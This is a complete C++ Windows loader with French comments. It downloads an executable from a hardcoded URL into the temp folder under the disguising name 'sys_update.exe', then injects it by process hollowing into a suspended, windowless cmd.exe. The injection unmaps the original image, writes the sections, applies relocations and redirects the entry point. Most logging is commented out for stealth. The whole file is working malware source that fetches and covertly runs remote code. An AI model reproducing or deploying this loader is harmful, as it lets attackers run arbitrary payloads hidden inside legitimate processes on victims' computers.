
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>
#include <urlmon.h>
#include <cstdio>

// --- CONFIGURATION ---
#define DIRECT_LINK "https://coucou.com"

// --- DÉFINITIONS ---
typedef struct _PEB64 {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[21];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    BYTE Reserved3[520];
    PVOID PostProcessInitRoutine;
    BYTE Reserved4[136];
    ULONG SessionId;
} PEB64, *PPEB64;

typedef NTSTATUS(WINAPI* LPNTUNMAPVIEWOFSECTION)(HANDLE, PVOID);

// --- FONCTIONS UTILITAIRES ---
void Log(const char* msg) {
    // std::cout << "[*] " << msg << std::endl;
}

void LogSuccess(const char* msg) {
    // std::cout << "[+] " << msg << std::endl;
}

void LogError(const char* msg) {
    // std::cerr << "[-] Error: " << msg << " (Code: " << GetLastError() << ")" << std::endl;
}

// Fonction RunPE (Process Hollowing)
bool RunPE(void* lpPayload, const char* lpTargetHost) {
    Log("Analyse du Payload...");
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpPayload;
    if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        LogError("Signature DOS invalide");
        return false;
    }

    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)lpPayload + pDOSHeader->e_lfanew);
    if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
        LogError("Signature NT invalide");
        return false;
    }

    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    std::cout << "[*] Creation du processus hote suspendu : " << lpTargetHost << std::endl;
    if (!CreateProcessA(lpTargetHost, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        LogError("Echec de CreateProcessA");
        return false;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        LogError("Echec de GetThreadContext");
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    PVOID targetImageBase = 0;
#ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &targetImageBase, sizeof(PVOID), NULL);
#else
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &targetImageBase, sizeof(PVOID), NULL);
#endif

    if (targetImageBase == (PVOID)pNTHeaders->OptionalHeader.ImageBase) {
        Log("Unmapping de la memoire originale...");
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        LPNTUNMAPVIEWOFSECTION pNtUnmapViewOfSection = (LPNTUNMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if (pNtUnmapViewOfSection) pNtUnmapViewOfSection(pi.hProcess, targetImageBase);
    }

    Log("Allocation de la nouvelle memoire...");
    LPVOID pRemoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)pNTHeaders->OptionalHeader.ImageBase, 
        pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pRemoteImage) {
        pRemoteImage = VirtualAllocEx(pi.hProcess, NULL, 
            pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteImage) {
            LogError("Echec de VirtualAllocEx");
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    }

    DWORD_PTR deltaImageBase = (DWORD_PTR)pRemoteImage - pNTHeaders->OptionalHeader.ImageBase;

    Log("Ecriture des Headers...");
    WriteProcessMemory(pi.hProcess, pRemoteImage, lpPayload, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

    Log("Ecriture des Sections...");
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaders);
    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID pSectionDestination = (LPVOID)((DWORD_PTR)pRemoteImage + pSectionHeader[i].VirtualAddress);
        LPVOID pSectionSource = (LPVOID)((DWORD_PTR)lpPayload + pSectionHeader[i].PointerToRawData);
        WriteProcessMemory(pi.hProcess, pSectionDestination, pSectionSource, pSectionHeader[i].SizeOfRawData, NULL);
    }

    if (deltaImageBase != 0) {
        Log("Application des Relocations...");
        IMAGE_DATA_DIRECTORY relocDir = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lpPayload + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress != 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* pRelocInfo = (WORD*)((DWORD_PTR)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < count; i++) {
                    if ((pRelocInfo[i] >> 12) == IMAGE_REL_BASED_HIGHLOW || (pRelocInfo[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        LPVOID pPatchAddr = (LPVOID)((DWORD_PTR)pRemoteImage + pReloc->VirtualAddress + (pRelocInfo[i] & 0xFFF));
                        DWORD_PTR originalAddr = 0;
                        ReadProcessMemory(pi.hProcess, pPatchAddr, &originalAddr, sizeof(DWORD_PTR), NULL);
                        originalAddr += deltaImageBase;
                        WriteProcessMemory(pi.hProcess, pPatchAddr, &originalAddr, sizeof(DWORD_PTR), NULL);
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    Log("Mise a jour du contexte (Entry Point)...");
#ifdef _WIN64
    ctx.Rcx = (DWORD_PTR)pRemoteImage + pNTHeaders->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pNTHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#else
    ctx.Eax = (DWORD_PTR)pRemoteImage + pNTHeaders->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pNTHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        LogError("Echec de SetThreadContext");
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    Log("Reprise du Thread...");
    if (ResumeThread(pi.hThread) == -1) {
        LogError("Echec de ResumeThread");
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    LogSuccess("INJECTION REUSSIE !");
    std::cout << "    PID du processus hote: " << pi.dwProcessId << std::endl;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

// Fonction de téléchargement
bool DownloadAndExecute() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string downloadPath = std::string(tempPath) + "sys_update.exe";

    std::cout << "========================================" << std::endl;
    std::cout << "   PAYLOAD LOADER (DEBUG MODE)          " << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << "[*] URL: " << DIRECT_LINK << std::endl;
    std::cout << "[*] Destination: " << downloadPath << std::endl;

    Log("Telechargement en cours...");

    typedef BOOL (WINAPI *PDeleteUrlCacheEntryA)(LPCSTR);
    HMODULE hWinInet = LoadLibraryA("wininet.dll");
    if (hWinInet) {
        PDeleteUrlCacheEntryA pDeleteUrlCacheEntryA = (PDeleteUrlCacheEntryA)GetProcAddress(hWinInet, "DeleteUrlCacheEntryA");
        if (pDeleteUrlCacheEntryA) pDeleteUrlCacheEntryA(DIRECT_LINK);
        FreeLibrary(hWinInet);
    }

    HRESULT hr = URLDownloadToFileA(NULL, DIRECT_LINK, downloadPath.c_str(), 0, NULL);
    if (hr != S_OK) {
        LogError("Echec du telechargement (URLDownloadToFileA)");
        std::cout << "    Code erreur HRESULT: 0x" << std::hex << hr << std::endl;
        return false;
    }
    LogSuccess("Telechargement termine.");

    Log("Lecture du fichier en memoire...");
    FILE* f = fopen(downloadPath.c_str(), "rb");
    if (!f) {
        LogError("Impossible d'ouvrir le fichier telecharge");
        return false;
    }

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    std::cout << "    Taille du fichier: " << size << " octets" << std::endl;

    void* payloadBuffer = malloc(size);
    if (!payloadBuffer) {
        LogError("Echec d'allocation memoire");
        fclose(f);
        return false;
    }

    fread(payloadBuffer, 1, size, f);
    fclose(f);

    // Injection dans cmd.exe
    char systemDir[MAX_PATH];
    GetSystemDirectoryA(systemDir, MAX_PATH);
    std::string targetPath = std::string(systemDir) + "\\cmd.exe";

    bool success = RunPE(payloadBuffer, targetPath.c_str());
    
    free(payloadBuffer);
    return success;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // SetConsoleTitleA("Payload Loader - Logs"); // Removed console title
    
    if (std::string(DIRECT_LINK) == "PLACEHOLDER_URL") {
        // LogError("L'URL n'a pas ete configuree !");
        return 1;
    }

    if (DownloadAndExecute()) {
        // std::cout << "\n[+] TOUT EST OK." << std::endl;
    } else {
        // std::cout << "\n[-] UNE ERREUR EST SURVENUE." << std::endl;
    }

    // std::cout << "\nAppuyez sur une touche pour fermer..." << std::endl;
    // system("pause > nul");
    return 0;
}
